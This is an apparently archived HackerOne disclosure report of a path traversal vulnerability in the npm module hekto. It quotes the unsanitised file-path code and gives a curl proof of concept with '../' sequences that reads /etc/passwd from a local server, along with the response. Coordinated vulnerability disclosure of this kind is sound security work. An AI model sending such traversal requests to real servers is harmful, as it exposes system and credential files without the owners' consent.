@@ -1,0 +1,151 @@
+ReportLink:https://hackerone.com/reports/311218
+WeaknessName:Path Traversal
+Reporter:https://hackerone.com/bl4de
+ReportedTo:Node.js third-party modules(nodejs-ecosystem)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:26.02.2018 22:10:49
+
+Summary:
+
+Hi Guys,
+
+There is Path Traversal vulnerability in hekto module, which allows to read arbitrary file from the remote server.
+
+## Module
+
+**hekto**
+
+This package exposes a directory and its children to create, read, update, and delete operations over http.
+
+https://www.npmjs.com/package/hekto
+
+version: 0.2.0
+
+Stats
+0 downloads in the last day
+7 downloads in the last week
+36 downloads in the last month
+
+~420 estimated downloads per year
+
+
+## Description
+
+This vulnerability exists, because there is no sanitization of path of requested file. In line 80 (index.js) ```file``` is set:
+
+```javascript
+// node_modules/hekto/bin/hekto.js line 80:
+    let file = path.join(process.cwd(), argDir, this.request.url);
+```
+
+Then, this variable is used "as is" in code which reads file from the server:
+
+```javascript
+// node_modules/hekto/bin/hekto.js line 126:
+
+    // if `file` is a file
+    if (fs.lstatSync(file).isFile()) {
+        this.status = 200;
+
+        if (path.extname(file) == '.html') {
+            this.type = 'text/html';
+            this.body = fs.createReadStream(file);
+        } else if (path.extname(file) == '.css') {
+            this.type = 'text/css';
+            this.body = fs.createReadStream(file);
+        } else {
+            const fileBuffer = readChunk.sync(file, 0, 4100);
+            const mime = fileType(fileBuffer);
+
+            if (mime) {
+                this.type = mime.mime + '; charset=utf-8';
+            } else {
+                this.type = 'text/plain; charset=utf-8';
+            }
+
+            this.body = fs.createReadStream(file);
+        }
+    }
+```
+
+## Steps To Reproduce:
+
+- install ```hekto``` module
+
+```
+$ npm install hekto
+```
+
+- run server from command line:
+
+```
+$ ./node_modules/hekto/bin/hekto.js serve
+
+Serving on port 3000
+
+```
+
+- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):
+
+```
+$ curl -v --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd
+```
+
+Result:
+
+```
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 3000 (#0)
+> GET /../../../../../etc/passwd HTTP/1.1
+> Host: 127.0.0.1:3000
+> User-Agent: curl/7.54.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Vary: Accept-Encoding
+< X-Powered-By: Hekto
+< Content-Type: text/plain; charset=utf-8
+< Date: Wed, 31 Jan 2018 23:08:42 GMT
+< Connection: keep-alive
+< Transfer-Encoding: chunked
+<
+##
+# User Database
+#
+# Note that this file is consulted directly only when the system is running
+# in single-user mode.  At other times this information is provided by
+# Open Directory.
+#
+# See the opendirectoryd(8) man page for additional information about
+# Open Directory.
+##
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+(...)
+```
+
+## Supporting Material/References:
+
+Configuration:
+
+- macOS 10.13.3
+- Chromium 66.0.3331.0 (Developer Build) (64-bit) 
+- Node.js version: v8.9.3
+- npm version: 5.5.1
+- curl 7.54.0
+
+
+Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.
+
+I hope my report will help to keep Node.js ecosystem and its users safe in the future.
+
+Regards,
+
+Rafal 'bl4de' Janicki
+
+## Impact
+
+This vulnerability can be used to read content of any file from remote server where hekto is run.
